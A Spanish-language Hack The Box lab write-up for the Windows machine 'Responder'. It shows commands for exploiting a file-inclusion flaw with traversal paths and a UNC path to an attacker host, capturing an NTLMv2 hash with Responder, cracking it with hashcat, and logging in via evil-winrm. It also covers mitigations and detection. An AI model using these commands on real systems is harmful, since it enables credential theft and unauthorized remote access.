---
machine: Responder
os: Windows
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [windows, lfi, ntlm, winrm, tier1]
---

# Responder — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 1 · Windows · Very Easy

## TL;DR

`unika.htb` incluye ficheros locales con `?page=`, y además acepta rutas UNC. Apuntando `page` a un recurso SMB propio, el servidor se autentica contra nosotros y **Responder** captura el hash NetNTLMv2 de `Administrator`. Se rompe offline (`badminton`), se entra por **WinRM (5985/tcp)** y se lee la flag.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT     STATE SERVICE   VERSION
80/tcp   open  http      Apache httpd 2.4.52 ((Win64) PHP/8.1.1)
5985/tcp open  http      Microsoft HTTPAPI httpd 2.0 (WinRM)
```

- **80/tcp** con PHP sobre Windows y el vhost `unika.htb`.
- **5985/tcp** WinRM, el acceso remoto que se usará al final.
- Sin SMB expuesto: el servidor es el cliente, no el servidor, en la fase de captura.

```bash
echo "<TARGET_IP>    unika.htb" | sudo tee -a /etc/hosts
```

## Enumeración

La web ofrece un selector de idioma que carga `?page=french.html`:

```bash
curl -s "http://unika.htb/index.php?page=french.html" | head
```

Se confirma el LFI con un fichero del sistema:

```bash
curl -s "http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts"
```

Y se comprueba si además acepta recursos remotos (RFI), que en PHP depende de `allow_url_include` y del wrapper SMB en Windows:

```bash
curl -s "http://unika.htb/index.php?page=//<ATTACKER_IP>/somefile"
```

- La ruta UNC hace que el proceso web intente autenticarse por SMB contra el atacante.
- Windows envía el hash NetNTLMv2 de la cuenta con la que corre el servicio (`Administrator`).

## Foothold

```bash
sudo responder -I tun0 -v
```

Se repite la petición con la ruta UNC y Responder registra:

```text
[SMB] NTLMv2-SSP Client   : <TARGET_IP>
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:<...>
```

Cracking offline:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# john --format=netntlmv2 hash.txt --wordlist=rockyou.txt
```

Resultado: `badminton`.

```bash
evil-winrm -i <TARGET_IP> -u Administrator -p '<PASSWORD>'
cat C:\Users\Administrator\Desktop\flag.txt
```

## Movimiento lateral

- El hash es de la cuenta Administrador local del propio host.
- WinRM permite administración remota (no hay un segundo equipo en la cadena).

## Escalada de privilegios

- No aplica: se entra directamente como `Administrator`.
- Si la cuenta hubiera sido de servicio, el paso siguiente habría sido `SeImpersonate`/`SeAssignPrimaryToken`.

## Evidencia

- Captura de Responder con el hash redactado.
- Sesión WinRM y flag redactada.
- Nada de hashes ni contraseñas reales en el repositorio.

## Lecciones aprendidas

- Un LFI se convierte en fuga de credenciales cuando el lenguaje permite wrappers remotos.
- Windows autentica automáticamente ante recursos UNC: es la base de los ataques de coerción.
- El hash NetNTLMv2 no se «pasa» tal cual: se rompe offline o se retransmite (relay) si SMB signing está deshabilitado.
- Responder debe escucharse en la interfaz de la VPN, no en `eth0`.

## Mitigaciones y detección

**Cómo se corrige:**

- Nunca construir rutas con entrada del usuario: lista blanca de ficheros permitidos.
- `allow_url_include=Off` y `allow_url_fopen=Off`.
- Deshabilitar el cliente SMB saliente del servidor web o bloquear 445 hacia Internet.
- Credenciales de servicio con privilegios mínimos y contraseñas robustas; obligar SMB signing.

**Cómo se detectaría:**

- Conexiones SMB salientes desde servidores web (evento 5140/4624 tipo 3 en el destino).
- Intentos de autenticación NTLM contra IPs externas.
- Logins WinRM (evento 91/4624) desde direcciones no habituales.

- CWE-98: Improper Control of Filename for Include
- CWE-522: Insufficiently Protected Credentials
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/), [T1110.002 Password Cracking](https://attack.mitre.org/techniques/T1110/002/)

## Referencias

- [Responder (lgandx)](https://github.com/lgandx/Responder)
- [Hashcat — modo 5600 NetNTLMv2](https://hashcat.net/wiki/doku.php?id=example_hashes)
